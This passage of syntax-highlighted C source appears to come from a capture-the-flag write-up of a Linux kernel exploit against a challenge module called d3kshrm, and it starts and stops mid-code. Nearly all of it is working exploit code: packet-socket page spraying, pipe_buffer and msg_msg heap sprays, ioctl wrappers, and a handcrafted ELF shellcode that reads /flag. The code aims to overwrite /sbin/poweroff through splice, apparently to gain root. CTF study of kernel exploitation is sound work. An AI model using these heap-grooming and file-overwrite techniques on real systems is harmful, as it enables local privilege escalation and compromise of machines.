class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(ERROR_MSG(<span class="hljs-string">&quot;[x] No socket fd for idx: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,req.idx);<br>                ret = -EINVAL;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            close(socket_fd[req.idx]);<br><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> PGV_CMD_EXIT:<br>            log_info(<span class="hljs-string">&quot;[*] PGV child exiting...&quot;</span>);<br>            ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">printf</span>(<br>                ERROR_MSG(<span class="hljs-string">&quot;[x] PGV child got unknown command : &quot;</span>)<span class="hljs-string">&quot;%d\n&quot;</span>,<br>                req.cmd<br>            );<br>            ret = -EINVAL;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        write(cmd_pipe_reply[<span class="hljs-number">1</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br>    &#125; <span class="hljs-keyword">while</span> (req.cmd != PGV_CMD_EXIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pgv_system</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* pipe for pgv */</span><br>    pipe(cmd_pipe_req);<br>    pipe(cmd_pipe_reply);<br>    <br>    <span class="hljs-comment">/* child process for pages spray */</span><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        spray_cmd_handler();<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_pgv_socket</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = PGV_CMD_ALLOC_SOCKET,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv_page_request));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">destroy_pgv_socket</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = PGV_CMD_FREE_SOCKET,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv_page_request));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = PGV_CMD_ALLOC_PAGE,<br>        .size = size,<br>        .nr = nr,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv_page_request));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">free_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = PGV_CMD_FREE_PAGE,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    usleep(<span class="hljs-number">10000</span>);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Challenge Interface</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_CREATE_D3KSHRM    0x3361626e</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DELETE_D3KSHRM    0x74747261</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_SELECT_D3KSHRM    0x746e6162</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_UNBIND_D3KSHRM    0x33746172</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PAGE_NR 0x100</span><br><br><span class="hljs-type">int</span> chal_fd;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">d3kshrm_create</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> page_nr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, CMD_CREATE_D3KSHRM, page_nr);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">d3kshrm_delete</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> idx)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, CMD_DELETE_D3KSHRM, idx);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">d3kshrm_select</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> idx)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, CMD_SELECT_D3KSHRM, idx);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">d3kshrm_unbind</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, CMD_UNBIND_D3KSHRM);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Exploitation procedure</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 126</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">prepare_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((err = pipe(pipe_fd[i])) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERROR_MSG(<span class="hljs-string">&quot;[x] failed to alloc &quot;</span>)<span class="hljs-string">&quot;%d&quot;</span>ERROR_MSG(<span class="hljs-string">&quot; pipe!\n&quot;</span>), i<br>            );<br>            <span class="hljs-keyword">return</span> err;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">expand_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((err = fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, size)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERROR_MSG(<span class="hljs-string">&quot;[x] failed to expand &quot;</span>)<span class="hljs-string">&quot;%d&quot;</span>ERROR_MSG(<span class="hljs-string">&quot; pipe!\n&quot;</span>), i<br>            );<br>            <span class="hljs-keyword">return</span> err;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], <span class="hljs-type">int</span> victim_fd)</span><br>&#123;<br>    <span class="hljs-type">ssize_t</span> err;<br>    <span class="hljs-type">loff_t</span> offset;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        offset = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> ((err = splice(victim_fd,&amp;offset,pipe_fd[i][<span class="hljs-number">1</span>],<span class="hljs-literal">NULL</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERROR_MSG(<span class="hljs-string">&quot;[x] failed to splice &quot;</span>)<span class="hljs-string">&quot;%d&quot;</span>ERROR_MSG(<span class="hljs-string">&quot; pipe!\n&quot;</span>),i<br>            );<br>            <span class="hljs-keyword">return</span> err;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PBF_SZ_PAGE_NR (0x1000 / 8)</span><br><br><span class="hljs-type">uint8_t</span> shellcode[] = &#123;<br>    <span class="hljs-comment">/* ELF header */</span><br><br>    <span class="hljs-comment">// e_ident[16]</span><br>    <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-comment">/* Magic number &quot;\x7fELF&quot; */</span><br>    <span class="hljs-number">0x02</span>,   <span class="hljs-comment">/* ELF type: 64-bit */</span><br>    <span class="hljs-number">0x01</span>,   <span class="hljs-comment">/* ELF encode: LSB */</span><br>    <span class="hljs-number">0x01</span>,   <span class="hljs-comment">/* ELF version: current */</span><br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,   <span class="hljs-comment">/* Reserve */</span><br>    <span class="hljs-comment">// e_type: ET_EXEC</span><br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_machine: AMD x86-64</span><br>    <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_version: 1</span><br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_entry: 0x0000000000400078</span><br>    <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_phoff: 0x40</span><br>    <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_shoff: 0</span><br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_flags: 0</span><br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_ehsize: 0x40</span><br>    <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_phentsize: 0x38</span><br>    <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_phnum: 1</span><br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_shentsize: 0</span><br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_shnum: 0</span><br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// e_shstrndx: 0</span><br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br><br>    <span class="hljs-comment">/* Program Header Table[0] */</span><br><br>    <span class="hljs-comment">// p_type: PT_LOAD</span><br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// p_flags: PF_R | PF_W | PF_X</span><br>    <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// p_offset: 0</span><br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// p_vaddr: 0x0000000000400000</span><br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// p_paddr: 0x0000000000400000</span><br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// p_filesz: 0xD5</span><br>    <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// p_memsz: 0xF2</span><br>    <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// p_align: 0x1000</span><br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br><br>    <span class="hljs-comment">/* Sections[0]: Shellcode */</span><br><br>    <span class="hljs-comment">// opening &quot;/flag&quot; and read</span><br><br>    <span class="hljs-comment">// xor rax, rax</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xc0</span>,<br>    <span class="hljs-comment">// push rax</span><br>    <span class="hljs-number">0x50</span>,<br>    <span class="hljs-comment">// movabs rax, 0x67616c662f # &quot;/flag&quot;</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// push rax</span><br>    <span class="hljs-number">0x50</span>,<br>    <span class="hljs-comment">// mov rax, 0x02</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// mov rdi, rsp</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>,<br>    <span class="hljs-comment">// xor rsi, rsi</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>,<br>    <span class="hljs-comment">// syscall</span><br>    <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>,<br>    <span class="hljs-comment">// mov rdi, rax</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xc7</span>,<br>    <span class="hljs-comment">// xor rax, rax</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xc0</span>,<br>    <span class="hljs-comment">// sub, rsp, 0x100</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// mov rsi, rsp</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe6</span>,<br>    <span class="hljs-comment">// mov rdi, 0x100</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// syscall</span><br>    <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>,<br>    <span class="hljs-comment">// mox rax, 0x1</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// mox rdi, 0x1</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// mox rsi, rsp</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe6</span>,<br>    <span class="hljs-comment">// mox rdx, 0x100</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// syscall</span><br>    <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>,<br>    <span class="hljs-comment">// xor rdi, rdi</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>,<br>    <span class="hljs-comment">// mov rax, 0x3c</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-comment">// syscall</span><br>    <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE8_SPRAY_NR 0x100</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">prepare_pgv_pages</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> errno;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PAGE8_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((errno = create_pgv_socket(i)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(ERROR_MSG(<span class="hljs-string">&quot;[x] Failed to allocate socket: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> errno;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((errno = alloc_page(i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(ERROR_MSG(<span class="hljs-string">&quot;[x] Failed to alloc pages on socket: &quot;</span>)<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> errno;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SPRAY_NR 2</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">prepare_msg_queue</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid[MSG_QUEUE_NR])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = get_msg_queue()) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERROR_MSG(<span class="hljs-string">&quot;[x] Unable to create &quot;</span>)<span class="hljs-string">&quot;%d&quot;</span>ERROR_MSG(<span class="hljs-string">&quot; msg_queue\n&quot;</span>),<br>                i<br>            );<br>            <span class="hljs-keyword">return</span> msqid[i];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spray_msg_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid[MSG_QUEUE_NR])</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x2000</span>];<br>    <span class="hljs-type">int</span> err;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; MSG_SPRAY_NR; j++) &#123;<br>            <span class="hljs-keyword">if</span> ((err = write_msg(msqid[i],buf,<span class="hljs-number">0xF00</span>,<span class="hljs-number">0x3361626e74747261</span>+i)) &lt; <span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-keyword">return</span> err;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> D3KSHRM_SLUB_OBJ_NR 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> D3KSHRM_SPRAY_NR (D3KSHRM_SLUB_OBJ_NR * 2)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> pipe_fd1[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], pipe_fd2[PIPE_SPRAY_NR][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> msqid[MSG_QUEUE_NR];<br>    <span class="hljs-type">int</span> d3kshrm_fd[D3KSHRM_SPRAY_NR], d3kshrm_idx[D3KSHRM_SPRAY_NR];<br>    <span class="hljs-type">int</span> victim_fd;<br>    <span class="hljs-type">char</span> *oob_buf[D3KSHRM_SPRAY_NR];<br>    <span class="hljs-type">void</span> *victim_buf;<br><br>    log_info(<span class="hljs-string">&quot;[*] Preparing...&quot;</span>);<br><br>    bind_core(<span class="hljs-number">0</span>);<br>    prepare_pgv_system();<br><br>    victim_fd = open(<span class="hljs-string">&quot;/sbin/poweroff&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (victim_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open target victim file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Allocating msg_queue for clearing kmem_cache...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (prepare_msg_queue(msqid) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Allocating pipe_fd1 group...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (prepare_pipe(pipe_fd1) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to spray pipe_buffer&quot;</span>));<br>        err_exit(<span class="hljs-string">&quot;FAILED to prepare first part of pipes.\n&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Allocating pipe_fd2 group...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (prepare_pipe(pipe_fd2) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to spray pipe_buffer&quot;</span>));<br>        err_exit(<span class="hljs-string">&quot;FAILED to prepare second part of pipes.\n&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Preparing D3KSHRM files...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; D3KSHRM_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((d3kshrm_fd[i] = open(<span class="hljs-string">&quot;/proc/d3kshrm&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>            perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to open /proc/d3kshrm&quot;</span>));<br>            err_exit(<span class="hljs-string">&quot;FAILED to spray D3KSHRM files.\n&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Pre-allocating ONE SLUB pages for D3kSHRM...&quot;</span>);<br>    <span class="hljs-keyword">if</span> ((d3kshrm_idx[<span class="hljs-number">0</span>] = d3kshrm_create(d3kshrm_fd[<span class="hljs-number">0</span>], PBF_SZ_PAGE_NR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to create D3KSHRM shared memory&quot;</span>));<br>        err_exit(<span class="hljs-string">&quot;FAILED to spray D3KSHRM shared memory.\n&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Allocating pgv pages...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (prepare_pgv_pages() &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to prepare pages on packet socket.\n&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Clear previous redundant memory storage in kernel...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spray_msg_msg(msqid) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to spray msg_msg&quot;</span>));<br>        err_exit(<span class="hljs-string">&quot;FAILED to clear reduncant kernel memory storage.\n&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Spraying D3KSHRM buffer...&quot;</span>);<br><br>    free_page((PAGE8_SPRAY_NR / <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>);<br>    destroy_pgv_socket((PAGE8_SPRAY_NR / <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; 